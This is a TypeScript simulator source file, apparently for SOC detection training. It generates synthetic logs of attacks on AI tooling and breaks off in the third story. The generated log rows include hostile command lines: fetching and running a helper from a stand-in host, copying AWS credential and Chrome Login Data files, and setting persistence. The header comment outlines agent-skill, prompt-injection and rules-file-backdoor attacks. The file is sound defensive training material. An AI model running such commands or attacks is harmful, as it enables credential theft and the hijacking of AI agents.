/**
 * AI attack stories, wave 4 part A: attacks on the tooling around AI, seen from endpoint,
 * network, ticketing and cloud logs. Most run on all five companies, because the first half of
 * each chain lives on telemetry every SOC has (EDR, firewall, DNS, ITSM); a chain that ends in a
 * cloud account comes in an AWS and an Azure build of one authored story.
 *
 *  1. ai-agent-skill-host-cloud-{aws,azure}  (advanced) a skill from a public marketplace is
 *     added to a coding agent; its setup step fetches and runs a helper that reads local
 *     credentials and uploads them; the credentials are then used from a hosting provider.
 *       Grounded on the ClawHub "ClawHavoc" campaign (Koi Security, Feb 2026): fake prerequisites
 *       in skill documentation leading to a stealer. ATLAS AML.T0010.005, AML.T0011.002,
 *       AML.T0083, AML.T0055. OWASP LLM03, ASI04.
 *  2. ai-hub-model-load-workstation  (core) a pickle-format model from a public hub opens a
 *       reverse connection when a notebook loads it. JFrog (Feb 2024) and ReversingLabs nullifAI
 *       (Feb 2025). ATLAS AML.T0010.003, AML.T0011.000, AML.T0018.002, AML.T0072. OWASP LLM03.
 *  3. ai-ticket-triage-agent-injection  (core) a customer ticket steers an AI triage worker into
 *       reading records outside the ticket and fetching an external URL. Cato CTRL "Living off
 *       AI" (Jun 2025); EchoLeak CVE-2025-32711 for the URL-fetch channel. ATLAS AML.T0051.001,
 *       AML.T0053, AML.T0077, AML.T0086. OWASP LLM01, ASI01, ASI02.
 *  4. ai-mcp-server-update-drift  (core) an approved MCP mail connector updates itself and gains
 *       a blind copy to an outside address. postmark-mcp 1.0.16 (Koi Security, Sep 2025).
 *       ATLAS AML.T0010.005, AML.T0104, AML.T0086. OWASP LLM03, ASI04.
 *  5. ai-exposed-inference-endpoint  (foundation) an Ollama server bound to all interfaces and
 *       published to the internet is listed and used by strangers. SentinelLABS / Censys
 *       (Jan 2026): about 175,000 exposed hosts. ATLAS AML.T0040, AML.T0034. OWASP LLM10.
 *  6. ai-exposed-vector-store  (foundation) a Chroma store started for a pilot on all interfaces
 *       is read from the internet. UpGuard (Dec 2025). ATLAS AML.T0085, AML.T0082. OWASP LLM08.
 *  7. ai-agent-rules-file-tamper  (core) a repository rules file for coding assistants grows
 *       after a pull; the code the assistant then writes calls out at build time. Pillar
 *       Security "Rules File Backdoor" (Mar 2025). ATLAS AML.T0081, AML.T0080. OWASP LLM01, LLM05.
 *  8. ai-assistant-commit-key-leak-{aws,azure}  (advanced) a coding agent's commit carries an
 *       .env into a public repository; the key is used from outside within minutes. Unit 42
 *       EleKtra-Leak (Oct 2023) for the timing. ATLAS AML.T0055, AML.T0040, AML.T0034. OWASP LLM02.
 *
 * Each story carries a benign twin of its first signal: the same rule or record from innocent
 * activity, told apart only by reading the fields. No prompt text appears anywhere: a request or
 * ticket body is shown only as a size, a classification or a truncated summary, as logs show it.
 * Host paths are Windows on purpose: the EDR console and the process trees work on every stack.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { csAlert, csDetection, csRegistry } from "@/lib/sim/emitters/crowdstrike";
import { cloudTrailEvent, guardDutyFinding } from "@/lib/sim/emitters/cloudtrail";
import { entraSignIn } from "@/lib/sim/emitters/entra";
import { azureActivity, azureOpenAiRequest, defenderAiAlert, type AzureAiResource } from "@/lib/sim/emitters/azureAi";
import type { AiStoryDef } from "./wave2";
import { CX, DEV, SUB, benign, conn, dnsRow, fileRow, inbound, netRow, proc, sentinel, ticket, web, withIncident } from "./wave4-shared";

type Cloud = "aws" | "azure";

/**
 * The alert twin on a clean file: the rule fired, but the engine's reputation for the file is
 * clean and no threat is named. That is the platform's false-positive signature (iocIntel), so a
 * hash lookup on this row reads clean while the attack row's reads malicious.
 */
function onCleanFile(e: TelemetryEvent): TelemetryEvent {
  const { "threat.name": _name, "crowdstrike.Technique": _technique, ...raw } = e.raw ?? {};
  return { ...e, raw: { ...raw, "av.verdict": "clean" } };
}
const dev = { host: DEV.host, ip: DEV.ip, user: DEV.user };
const home = `C:\\Users\\${DEV.bare}`;
const NODE = "C:\\Program Files\\nodejs\\node.exe";
const CMD = "C:\\Windows\\System32\\cmd.exe";
const AWS_KEY = "AKIAZ4NV7QKR2EXAMPLE";
const AWS_ARN = `arn:aws:iam::418772153604:user/${DEV.bare}`;
const UA_BOTO = "Boto3/1.35.20 md/Botocore#1.35.20 ua/2.0 os/linux#6.8.0 md/arch#x86_64 lang/python#3.12.4 cfg/retry-mode#legacy Botocore/1.35.20";
const AOAI: AzureAiResource = { subscriptionId: SUB, resourceGroup: "rg-ai-dev", account: "aoai-dev-weu", region: "westeurope" };

// ══════════════════════════════════════════════════════════════════════════════
// 1. A skill from a public marketplace, then the host, then the cloud
// ══════════════════════════════════════════════════════════════════════════════
function buildAgentSkill(cloud: Cloud): TelemetryEvent[] {
  const market = "skills.agenthub-market.example";
  const files = "files.skillassets.example";
  const upload = "api.skillassets.example";
  const remote = "198.51.100.171";
  const agentPid = 7412, shellPid = 7560, helperPid = 8124;
  const helperPath = `${home}\\AppData\\Local\\Temp\\prereq\\agent-runtime-svc.exe`;
  const helperSha = makeSha256("wave4:skill:agent-runtime-svc");
  const credPath = cloud === "aws" ? `${home}\\.aws\\credentials` : `${home}\\.azure\\msal_token_cache.bin`;
  const rule = "Unsigned Process Launched From Agent Tool Shell";

  const events: TelemetryEvent[] = [
    // The twin: an approved skill from the company's own artifact store, same process shape.
    benign(proc(dev, {
      id: "ai4sk01", ts: "2026-10-20T08:41:12.000Z", pid: 7036, processName: "cmd.exe", processPath: CMD, parentName: "node.exe", parentPid: 6920,
      cmdline: `cmd.exe /c curl.exe -sSL -o ${home}\\.agent\\skills\\pdf-tools\\tools.zip https://artifacts.nexacorp.com/agent-skills/pdf-tools-2.3.1.zip`,
      severity: "low", description: `The coding agent (node.exe) on ${DEV.host} started cmd.exe, which downloaded pdf-tools-2.3.1.zip from artifacts.nexacorp.com into the agent's skills folder.`,
    }), "The approved pdf-tools skill, fetched from the company's own artifact store into the agent's skills folder."),
    benign(web(dev, {
      id: "ai4sk01b", ts: "2026-10-20T08:41:14.000Z", url: "https://artifacts.nexacorp.com/agent-skills/pdf-tools-2.3.1.zip", domain: "artifacts.nexacorp.com", dstIp: "10.10.20.60", category: "computer-and-internet-info",
      method: "GET", action: "allow", status: 200, bytesIn: 4_120_880, bytesOut: 980, userAgent: "curl/8.9.1", file: { name: "pdf-tools-2.3.1.zip" }, fileType: "zip", severity: "informational",
      description: `Firewall URL log: ${DEV.host} downloaded pdf-tools-2.3.1.zip from artifacts.nexacorp.com.`,
    }), "The approved skill's download from the company's own artifact store."),
    benign(onCleanFile(csAlert({
      companyId: CX, id: "ai4sk02", ts: "2026-10-20T08:41:40.000Z", host: DEV.host, srcIp: DEV.ip, user: DEV.user,
      processName: "pdf-tools-setup.exe", processPath: `${home}\\.agent\\skills\\pdf-tools\\pdf-tools-setup.exe`, processTree: "node.exe > cmd.exe > pdf-tools-setup.exe",
      threatName: rule, technique: "User Execution", tactic: "Execution", action: "detected", severity: "medium",
      description: `Endpoint alert "${rule}" on ${DEV.host}: pdf-tools-setup.exe ran from the agent's skills folder as a child of cmd.exe under node.exe. Detect only, nothing blocked.`,
    })), "Same rule, innocent cause: the setup tool of the approved pdf-tools skill. Its folder and publisher store match the skill catalogue."),

    dnsRow({ id: "ai4sk03", ts: "2026-10-20T10:12:03.000Z", on: dev, query: market, answer: "203.0.113.171", severity: "low",
      mitre: "T1195.002", tactic: "Initial Access",
      description: `${DEV.host} resolved ${market}. The name has no earlier lookups in the retained DNS history.` }),
    web(dev, {
      id: "ai4sk04", ts: "2026-10-20T10:12:04.000Z", url: `https://${market}/packages/pdf-report-helper/1.4.0/bundle.tar.gz`, domain: market, dstIp: "203.0.113.171",
      category: "computer-and-internet-info", method: "GET", action: "allow", status: 200, bytesIn: 18422, bytesOut: 980, userAgent: "code-agent/3.2.1 node/22.11.0",
      severity: "low", mitre: "T1195.002", tactic: "Initial Access",
      description: `Firewall URL log: ${DEV.host} fetched bundle.tar.gz for pdf-report-helper 1.4.0 from ${market} with the code-agent user agent, allowed.`,
    }),
    fileRow(dev, {
      id: "ai4sk05", ts: "2026-10-20T10:12:07.000Z", path: `${home}\\.agent\\skills\\pdf-report-helper\\SKILL.md`, size: 6188, action: "file_create", sha256: makeSha256("wave4:skill:skill-md"),
      actorProcess: "node.exe", actorPath: NODE, actorPid: agentPid, severity: "low", mitre: "T1195.002", tactic: "Initial Access",
      description: `node.exe wrote SKILL.md (6,188 bytes) into a new skills folder, pdf-report-helper, on ${DEV.host}.`,
    }),
    proc(dev, {
      id: "ai4sk06", ts: "2026-10-20T10:12:31.000Z", pid: shellPid, processName: "cmd.exe", processPath: CMD, parentName: "node.exe", parentPid: agentPid,
      cmdline: `cmd.exe /c curl.exe -sSL -o ${home}\\AppData\\Local\\Temp\\prereq.zip https://${files}/win/prereq.zip && tar.exe -xf ${home}\\AppData\\Local\\Temp\\prereq.zip -C ${home}\\AppData\\Local\\Temp\\prereq`,
      severity: "medium", mitre: "T1204.002", tactic: "Execution",
      description: `node.exe (the coding agent) started cmd.exe, which downloaded prereq.zip from ${files} and unpacked it under the user's Temp folder.`,
    }),
    dnsRow({ id: "ai4sk07", ts: "2026-10-20T10:12:32.000Z", on: dev, query: files, answer: "203.0.113.172", severity: "low", mitre: "T1105", tactic: "Command and Control",
      description: `${DEV.host} resolved ${files}.` }),
    web(dev, {
      id: "ai4sk08", ts: "2026-10-20T10:12:33.000Z", url: `https://${files}/win/prereq.zip`, domain: files, dstIp: "203.0.113.172", category: "newly-registered-domain",
      method: "GET", action: "alert", status: 200, bytesIn: 6_412_880, bytesOut: 1120, userAgent: "curl/8.9.1", file: { name: "prereq.zip" }, fileType: "zip",
      severity: "medium", mitre: "T1105", tactic: "Command and Control",
      description: `Firewall URL log: ${DEV.host} downloaded prereq.zip (about 6.4 MB) from ${files}, category newly-registered-domain, action alert.`,
    }),
    fileRow(dev, {
      id: "ai4sk09", ts: "2026-10-20T10:12:41.000Z", path: helperPath, size: 6_288_960, action: "file_create", sha256: helperSha, signed: false,
      actorProcess: "tar.exe", actorPath: "C:\\Windows\\System32\\tar.exe", actorParentName: "cmd.exe", actorParentPid: shellPid, severity: "medium", mitre: "T1105", tactic: "Command and Control",
      description: `tar.exe wrote agent-runtime-svc.exe into ${home}\\AppData\\Local\\Temp\\prereq. The file is unsigned.`,
    }),
    proc(dev, {
      id: "ai4sk10", ts: "2026-10-20T10:12:44.000Z", pid: helperPid, processName: "agent-runtime-svc.exe", processPath: helperPath, parentName: "cmd.exe", parentPid: shellPid, sha256: helperSha, signed: false,
      cmdline: `"${helperPath}" --install`, severity: "high", mitre: "T1204.002", tactic: "Execution",
      description: `agent-runtime-svc.exe --install ran as a child of the same cmd.exe, under node.exe. No signature.`,
    }),
    csDetection({
      companyId: CX, id: "ai4sk11", ts: "2026-10-20T10:12:52.000Z", host: DEV.host, srcIp: DEV.ip, user: DEV.user, pid: helperPid, parentPid: shellPid,
      processName: "agent-runtime-svc.exe", processPath: helperPath, parentName: "cmd.exe", cmdline: `"${helperPath}" --install`, sha256: helperSha,
      threatName: rule, technique: "User Execution", tactic: "Execution", mitre: "T1204.002", action: "detected", severity: "high", eventType: "edr_alert",
      description: `Endpoint alert "${rule}" on ${DEV.host}: agent-runtime-svc.exe ran from Temp as a child of cmd.exe under node.exe. Detect only, nothing blocked.`,
    }),
    proc(dev, {
      id: "ai4sk12", ts: "2026-10-20T10:13:02.000Z", pid: 8212, processName: "cmd.exe", processPath: CMD, parentName: "agent-runtime-svc.exe", parentPid: helperPid,
      cmdline: `cmd.exe /c copy /y "${credPath}" ${home}\\AppData\\Local\\Temp\\prereq\\c1.dat`,
      severity: "high", mitre: "T1552.001", tactic: "Credential Access",
      description: `agent-runtime-svc.exe started cmd.exe, which copied ${credPath} into its Temp folder.`,
    }),
    proc(dev, {
      id: "ai4sk13", ts: "2026-10-20T10:13:05.000Z", pid: 8240, processName: "cmd.exe", processPath: CMD, parentName: "agent-runtime-svc.exe", parentPid: helperPid,
      cmdline: `cmd.exe /c copy /y "${home}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" ${home}\\AppData\\Local\\Temp\\prereq\\c2.dat`,
      severity: "high", mitre: "T1555.003", tactic: "Credential Access",
      description: `A second cmd.exe under agent-runtime-svc.exe copied the Chrome Login Data file into the same Temp folder.`,
    }),
    csRegistry({
      companyId: CX, id: "ai4sk14", ts: "2026-10-20T10:13:09.000Z", host: DEV.host, srcIp: DEV.ip, user: DEV.user,
      keyPath: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", valueName: "AgentRuntimeSvc", valueData: `"${helperPath}" --background`,
      writerProcess: "agent-runtime-svc.exe", severity: "high", mitre: "T1547.001", tactic: "Persistence",
      description: `agent-runtime-svc.exe set the Run value AgentRuntimeSvc to its own path in Temp, with --background.`,
    }),
    web(dev, {
      id: "ai4sk15", ts: "2026-10-20T10:13:21.000Z", url: `https://${upload}/v2/telemetry/upload`, domain: upload, dstIp: "203.0.113.173", category: "newly-registered-domain",
      method: "POST", action: "alert", status: 200, bytesIn: 412, bytesOut: 3_184_220, userAgent: "agent-runtime/1.0", severity: "high", mitre: "T1041", tactic: "Exfiltration",
      description: `Firewall URL log: ${DEV.host} POSTed about 3.1 MB to ${upload}, category newly-registered-domain, action alert. The session user agent is agent-runtime/1.0.`,
    }),
  ];

  if (cloud === "aws") {
    events.push(
      cloudTrailEvent({
        id: "ai4sk16", ts: "2026-10-20T13:48:10.000Z", companyId: CX, eventName: "GetCallerIdentity", eventSource: "sts.amazonaws.com", srcIp: remote,
        actorType: "IAMUser", actorName: DEV.bare, accessKeyId: AWS_KEY, arn: AWS_ARN, userAgent: UA_BOTO, readOnly: true, geo: { country: "Germany", city: "Frankfurt am Main" },
        severity: "medium", mitre: "T1078.004", tactic: "Initial Access",
        description: `AWS CloudTrail: GetCallerIdentity by access key ${AWS_KEY} (user ${DEV.bare}) from ${remote} with a Boto3 agent.`,
      }),
      cloudTrailEvent({
        id: "ai4sk17", ts: "2026-10-20T13:48:52.000Z", companyId: CX, eventName: "ListSecrets", eventSource: "secretsmanager.amazonaws.com", srcIp: remote,
        actorType: "IAMUser", actorName: DEV.bare, accessKeyId: AWS_KEY, arn: AWS_ARN, userAgent: UA_BOTO, readOnly: true, geo: { country: "Germany", city: "Frankfurt am Main" },
        severity: "medium", mitre: "T1526", tactic: "Discovery",
        description: `AWS CloudTrail: ListSecrets by the same key from ${remote}.`,
      }),
      cloudTrailEvent({
        id: "ai4sk18", ts: "2026-10-20T13:49:30.000Z", companyId: CX, eventName: "GetSecretValue", eventSource: "secretsmanager.amazonaws.com", srcIp: remote,
        actorType: "IAMUser", actorName: DEV.bare, accessKeyId: AWS_KEY, arn: AWS_ARN, userAgent: UA_BOTO, readOnly: true, geo: { country: "Germany", city: "Frankfurt am Main" },
        extra: { "aws.cloudtrail.requestParameters.secretId": "prod/payments-api/db" }, severity: "high", mitre: "T1555.006", tactic: "Credential Access",
        description: `AWS CloudTrail: GetSecretValue on prod/payments-api/db by the same key from ${remote}.`,
      }),
      cloudTrailEvent({
        id: "ai4sk19", ts: "2026-10-20T13:51:04.000Z", companyId: CX, eventName: "CreateAccessKey", eventSource: "iam.amazonaws.com", srcIp: remote,
        actorType: "IAMUser", actorName: DEV.bare, accessKeyId: AWS_KEY, arn: AWS_ARN, userAgent: UA_BOTO, geo: { country: "Germany", city: "Frankfurt am Main" },
        extra: { "aws.cloudtrail.requestParameters.userName": "svc-reporting" }, severity: "high", mitre: "T1098.001", tactic: "Persistence",
        description: `AWS CloudTrail: CreateAccessKey for IAM user svc-reporting by the same key from ${remote}.`,
      }),
      guardDutyFinding({
        id: "ai4sk20", ts: "2026-10-20T14:02:33.000Z", companyId: CX, findingType: "CredentialAccess:IAMUser/AnomalousBehavior", gdSeverity: 5,
        title: "An API commonly used to access credentials or secrets was invoked in an anomalous way.", api: "GetSecretValue", serviceName: "secretsmanager.amazonaws.com",
        callerType: "Remote IP", srcIp: remote, remoteCountry: "Germany", asnOrg: "hosting provider", resourceType: "AccessKey", userType: "IAMUser", userName: DEV.bare, accessKeyId: AWS_KEY, count: 3,
        severity: "medium", mitre: "T1555.006", tactic: "Credential Access",
        description: `GuardDuty raised CredentialAccess:IAMUser/AnomalousBehavior for ${AWS_KEY}: GetSecretValue from ${remote}, outside the identity's learned network and client.`,
      }),
    );
    return withIncident(events, "inc:ai4sk:aws");
  }

  const remoteGeo = { country: "Germany", iso: "DE", city: "Frankfurt am Main", lat: 50.1109, lon: 8.6821 };
  events.push(
    entraSignIn({
      companyId: CX, id: "ai4sk16", ts: "2026-10-20T13:48:10.000Z", user: DEV.user, srcIp: remote, app: "Microsoft Azure CLI", appId: "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
      resource: "Windows Azure Service Management API", isInteractive: false, managed: false, compliant: false, os: "Linux", userAgent: "python-requests/2.32.3", incomingTokenType: "refreshToken",
      riskLevel: "medium", geo: { country: "Germany", city: "Frankfurt am Main", countryCode: "DE" }, severity: "medium", mitre: "T1528", tactic: "Credential Access",
      description: `Entra sign-in for ${DEV.bare} to Microsoft Azure CLI from ${remote} on an unmanaged Linux client, token type refreshToken, risk medium.`,
    }),
    azureActivity({
      id: "ai4sk17", ts: "2026-10-20T13:49:30.000Z", resource: AOAI, operation: "MICROSOFT.COGNITIVESERVICES/ACCOUNTS/LISTKEYS/ACTION", caller: DEV.user, callerIp: remote,
      severity: "high", mitre: "T1555.006", tactic: "Credential Access",
      description: `Azure Activity Log: ${DEV.bare} listed the keys of ${AOAI.account} from ${remote}.`,
    }),
    azureOpenAiRequest({
      id: "ai4sk18", ts: "2026-10-20T13:52:04.000Z", resource: AOAI, deployment: "gpt-4o-dev", callerIp: remote, status: 200, durationMs: 2210, requestLength: 4120, responseLength: 3908,
      severity: "medium", mitre: "T1496.004", tactic: "Impact",
      description: `Azure OpenAI RequestResponse log: ChatCompletions_Create on gpt-4o-dev from a caller in the ${remote.replace(/\.\d+$/, ".***")} range, authenticated by key. The deployment's usual callers are the dev subnet's egress.`,
    }),
    defenderAiAlert({
      id: "ai4sk19", ts: "2026-10-20T14:02:33.000Z", startTs: "2026-10-20T13:52:04.000Z", resource: AOAI, alert: "accessAnomaly", clientIp: remote, deployment: "gpt-4o-dev", asOrg: "hosting provider", geo: remoteGeo,
      alertDescription: "Access to the Azure AI resource aoai-dev-weu deviates from its historical pattern: a new client IP range and a new authentication method for this deployment.",
      severity: "medium", mitre: "T1078.004", tactic: "Initial Access",
      description: `Defender for Cloud raised Access anomaly in AI resource on ${AOAI.account}: a new IP range and authentication method for deployment gpt-4o-dev.`,
    }),
    sentinel({
      id: "ai4sk20", ts: "2026-10-20T14:09:11.000Z", host: DEV.host, srcIp: remote, user: DEV.user, severity: "high", eventType: "cloud_api_call", mitre: "T1528", tactic: "Credential Access",
      alertName: "Azure control-plane use from a new network after a credential-file copy on the user's endpoint",
      detail: "A sign-in from a hosting network and a ListKeys call by one identity, joined to a copy of that identity's token cache on its workstation in the previous hours.",
      startTime: "2026-10-20T10:13:02.000Z", endTime: "2026-10-20T14:02:33.000Z",
      extendedProperties: { Identity: DEV.user, "Endpoint": DEV.host, "Copied file": credPath, "Sign-in IP": remote, "Azure operation": "LISTKEYS/ACTION" },
      description: `Microsoft Sentinel joined the sign-in and ListKeys from ${remote} to the copy of ${credPath} on ${DEV.host} earlier the same day.`,
    }),
  );
  return withIncident(events, "inc:ai4sk:azure");
}

// ══════════════════════════════════════════════════════════════════════════════
// 2. A model from a public hub, loaded in a notebook
// ══════════════════════════════════════════════════════════════════════════════
function buildHubModelLoad(): TelemetryEvent[] {
  const hub = "hub.openmodels.example";
  const remote = "198.51.100.172";
  const python = `${home}\\miniconda3\\envs\\ml\\python.exe`;
  const kernelCmd = `"${python}" -m ipykernel_launcher -f ${home}\\AppData\\Roaming\\jupyter\\runtime\\kernel-3f1c.json`;
  const kernelPid = 5184;
  const modelPath = `${home}\\.cache\\modelhub\\sentiment-bert-ft\\pytorch_model.bin`;
  const rule = "Script Interpreter Spawned Shell";

  return withIncident([
    benign(web(dev, {
      id: "ai4md01", ts: "2026-10-21T08:20:14.000Z", url: "https://mlmirror.nexacorp.com/models/bert-base/model.safetensors", domain: "mlmirror.nexacorp.com", dstIp: "10.10.20.50",
      category: "computer-and-internet-info", method: "GET", action: "allow", status: 200, bytesIn: 438_122_704, bytesOut: 1204, userAgent: "python-requests/2.32.3", file: { name: "model.safetensors" }, fileType: "unknown",
      severity: "informational", description: `${DEV.host} downloaded model.safetensors (about 438 MB) from the internal mirror mlmirror.nexacorp.com.`,
    }), "The team's approved model, in the safetensors format, from the internal mirror."),
    benign(onCleanFile(csAlert({
      companyId: CX, id: "ai4md02", ts: "2026-10-21T08:24:40.000Z", host: DEV.host, srcIp: DEV.ip, user: DEV.user, processName: "nvidia-smi.exe", processPath: "C:\\Windows\\System32\\nvidia-smi.exe",
      processTree: "jupyter-lab.exe > python.exe > nvidia-smi.exe", threatName: rule, technique: "Command and Scripting Interpreter", tactic: "Execution",
      cmdline: "nvidia-smi.exe --query-gpu=memory.used --format=csv", action: "detected", severity: "low",
      description: `Endpoint alert "${rule}" on ${DEV.host}: python.exe started nvidia-smi.exe --query-gpu=memory.used --format=csv. Detect only.`,
    })), "The notebook polling GPU memory: a signed NVIDIA tool, a fixed query, and no network activity from the child."),

    dnsRow({ id: "ai4md03", ts: "2026-10-21T09:14:05.000Z", on: dev, query: hub, answer: "203.0.113.174", severity: "low", mitre: "T1195.002", tactic: "Initial Access",
      description: `${DEV.host} resolved ${hub}, a public model hub.` }),
    web(dev, {
      id: "ai4md04", ts: "2026-10-21T09:14:06.000Z", url: `https://${hub}/acme-labs/sentiment-bert-ft/resolve/main/pytorch_model.bin`, domain: hub, dstIp: "203.0.113.174", category: "computer-and-internet-info",
      method: "GET", action: "allow", status: 200, bytesIn: 267_441_920, bytesOut: 1312, userAgent: "python-requests/2.32.3", file: { name: "pytorch_model.bin" }, fileType: "unknown",
      severity: "low", mitre: "T1195.002", tactic: "Initial Access",
      description: `Firewall URL log: ${DEV.host} downloaded pytorch_model.bin (about 267 MB) from ${hub}, repository acme-labs/sentiment-bert-ft, allowed.`,
    }),
    fileRow(dev, {
      id: "ai4md05", ts: "2026-10-21T09:15:58.000Z", path: modelPath, size: 267_441_920, action: "file_create", sha256: makeSha256("wave4:model:pytorch-model-bin"),
      actorProcess: "python.exe", actorPath: python, actorPid: kernelPid, severity: "low", mitre: "T1195.002", tactic: "Initial Access",
      description: `python.exe (the Jupyter kernel) wrote pytorch_model.bin into the model cache.`,
    }),
    netRow(dev, {
      id: "ai4md06", ts: "2026-10-21T09:16:40.000Z", remoteIp: remote, remotePort: 8443, processName: "python.exe", processPath: python, cmdline: kernelCmd, pid: kernelPid, parentName: "jupyter-lab.exe",
      bytesOut: 412, bytesIn: 96, severity: "high", mitre: "T1059.006", tactic: "Execution",
      description: `The Jupyter kernel python.exe opened a TCP connection to ${remote}:8443, 42 seconds after the model file finished writing. The destination was not resolved through DNS first.`,
    }),
    conn(dev, {
      id: "ai4md07", ts: "2026-10-21T09:16:41.000Z", dstIp: remote, remotePort: 8443, app: "unknown-tcp", action: "allow", end: true, bytesOut: 18_204, bytesIn: 96_412, elapsedSec: 180, severity: "medium", mitre: "T1071.001", tactic: "Command and Control",
      description: `Firewall session end: ${DEV.host} to ${remote}:8443, application unknown-tcp, allowed, three minutes.`,
    }),
    proc(dev, {
      id: "ai4md08", ts: "2026-10-21T09:17:12.000Z", pid: 6020, processName: "cmd.exe", processPath: CMD, parentName: "python.exe", parentPid: kernelPid, cmdline: "cmd.exe /c whoami /all",
      severity: "high", mitre: "T1033", tactic: "Discovery", description: `python.exe (the same kernel) started cmd.exe /c whoami /all.`,
    }),
    csAlert({
      companyId: CX, id: "ai4md09", ts: "2026-10-21T09:17:15.000Z", host: DEV.host, srcIp: DEV.ip, user: DEV.user, pid: 6020, processName: "cmd.exe", processPath: CMD,
      processTree: "jupyter-lab.exe > python.exe > cmd.exe", threatName: rule, technique: "Command and Scripting Interpreter", tactic: "Execution", mitre: "T1059.003",
      cmdline: "cmd.exe /c whoami /all", action: "detected", severity: "high",
      description: `Endpoint alert "${rule}" on ${DEV.host}: python.exe started cmd.exe /c whoami /all. Detect only.`,
    }),
    proc(dev, {
      id: "ai4md10", ts: "2026-10-21T09:17:44.000Z", pid: 6112, processName: "cmd.exe", processPath: CMD, parentName: "python.exe", parentPid: kernelPid, cmdline: "cmd.exe /c ipconfig /all",
      severity: "medium", mitre: "T1016", tactic: "Discovery", description: `The kernel started cmd.exe /c ipconfig /all.`,
    }),
    proc(dev, {
      id: "ai4md11", ts: "2026-10-21T09:18:20.000Z", pid: 6204, processName: "cmd.exe", processPath: CMD, parentName: "python.exe", parentPid: kernelPid, cmdline: `cmd.exe /c type ${home}\\.cache\\modelhub\\token`,
      severity: "high", mitre: "T1552.001", tactic: "Credential Access", description: `The kernel started cmd.exe to print the model-hub access token file in the user's cache.`,
    }),
    proc(dev, {
      id: "ai4md12", ts: "2026-10-21T09:19:03.000Z", pid: 6288, processName: "schtasks.exe", processPath: "C:\\Windows\\System32\\schtasks.exe", parentName: "python.exe", parentPid: kernelPid, eventType: "scheduled_task",
      cmdline: `schtasks.exe /create /tn "ModelCacheRefresh" /sc onlogon /tr "${python} ${home}\\AppData\\Local\\ModelCache\\refresh.py"`,
      severity: "high", mitre: "T1053.005", tactic: "Persistence", description: `The kernel created a scheduled task ModelCacheRefresh that runs python on refresh.py at logon.`,
    }),
    sentinel({
      id: "ai4md13", ts: "2026-10-21T09:24:10.000Z", host: DEV.host, srcIp: DEV.ip, user: DEV.user, severity: "high", eventType: "process_create", mitre: "T1059.006", tactic: "Execution",
      alertName: "Notebook kernel opened an outbound session and spawned shells after a model download",
      detail: "A scheduled rule joined a pickle-format model download, the kernel's connection to an address with no DNS lookup, and shell children of that kernel on one host.",
      startTime: "2026-10-21T09:14:06.000Z", endTime: "2026-10-21T09:19:03.000Z",
      extendedProperties: { "Model source": hub, "Model file": "pytorch_model.bin", "Remote address": `${remote}:8443`, "Shell children": 3, "Scheduled task": "ModelCacheRefresh" },
      description: `Microsoft Sentinel joined the download of pytorch_model.bin from ${hub}, the kernel's session to ${remote}:8443, its shell children and the task ModelCacheRefresh on ${DEV.host}.`,
    }),
  ], "inc:ai4md");
}

// ══════════════════════════════════════════════════════════════════════════════
// 3. A customer ticket steers an AI triage worker
// ══════════════════════════════════════════════════════════════════════════════
function buildTicketAgentInjection(): TelemetryEvent[] {
  const support = "m.levi@nexacorp.com";
  const worker = { host: "SRV-NXC-APP07", ip: "10.10.20.70", user: "svc-ai-triage@nexacorp.com" };
  const python = "C:\\Services\\ai-triage\\venv\\Scripts\\python.exe";
  const imgHost = "img.ticket-assets.example";
  const wlPid = 4410;

  return withIncident([
    benign(ticket({
      id: "ai4tk01", ts: "2026-10-22T08:05:12.000Z", number: "INC0091140", state: "In Progress", caller: support, severity: "informational",
      shortDescription: "Invoice copy request, order 44102",
      extra: { "servicenow.category": "Billing", "servicenow.contact_type": "Self-service", "servicenow.opened_by": "customer.portal", "servicenow.assigned_to": support,
        "servicenow.work_notes": "AI triage: billing request, order 44102, one record read, draft reply prepared for the agent." },
      description: "ServiceNow incident INC0091140: a portal request for an invoice copy. The AI triage note records one record read.",
    }), "A normal AI-assisted ticket: one customer record read, a draft reply, nothing outside the ticket."),
    benign(web({ host: worker.host, ip: worker.ip, user: worker.user }, {
      id: "ai4tk02", ts: "2026-10-22T08:05:30.000Z", url: "https://docs.carrierlink.example/tracking/help.png", domain: "docs.carrierlink.example", dstIp: "203.0.113.179", category: "business-and-economy",
      method: "GET", action: "alert", status: 200, bytesIn: 21_180, bytesOut: 640, userAgent: "ai-triage-worker/2.4", severity: "low",
      description: `Firewall URL log: ${worker.host} fetched help.png from docs.carrierlink.example with the ai-triage-worker agent, action alert.`,
    }), "The worker's link preview for a carrier help page a customer pasted: a static image, no query string, a few hundred bytes out."),

    ticket({
      id: "ai4tk03", ts: "2026-10-22T10:31:44.000Z", number: "INC0091182", state: "New", caller: support, severity: "low", mitre: "T1566", tactic: "Initial Access",
      shortDescription: "Billing question about a duplicate charge",
      extra: { "servicenow.category": "Billing", "servicenow.contact_type": "Self-service", "servicenow.opened_by": "customer.portal", "servicenow.assigned_to": support,
        "servicenow.description": "Customer reports a duplicate charge on order 44871. [portal form text, 4,212 characters, truncated by connector at 64]" },
      description: "ServiceNow incident INC0091182 from the customer portal: a duplicate-charge question. The form text is 4,212 characters and the connector kept the first 64.",
    }),
    proc(worker, {
      id: "ai4tk04", ts: "2026-10-22T10:33:02.000Z", pid: 4620, processName: "python.exe", processPath: python, parentName: "nssm.exe", parentPid: wlPid,
      cmdline: `"${python}" -m triage.worker --ticket INC0091182 --mode summarize --requested-by m.levi`, severity: "low", mitre: "T1059.006", tactic: "Execution",
      description: `On ${worker.host}, the AI triage service started a worker for INC0091182, summarize mode, requested by m.levi.`,
    }),
    ticket({
      id: "ai4tk05", ts: "2026-10-22T10:33:09.000Z", table: "syslog_transaction", number: "TX0448120", state: "Complete", caller: worker.user, severity: "medium", mitre: "T1213", tactic: "Collection",
      shortDescription: "REST table read by svc-ai-triage",
      extra: { "servicenow.type": "REST", "servicenow.opened_by": "svc-ai-triage", "servicenow.description": "GET /api/now/table/customer_account?sysparm_limit=500 status 200 rows 500; ticket context INC0091182" },
      description: "ServiceNow transaction log: svc-ai-triage read 500 rows of customer_account over REST while working INC0091182. The earlier ticket shows one record read.",
    }),
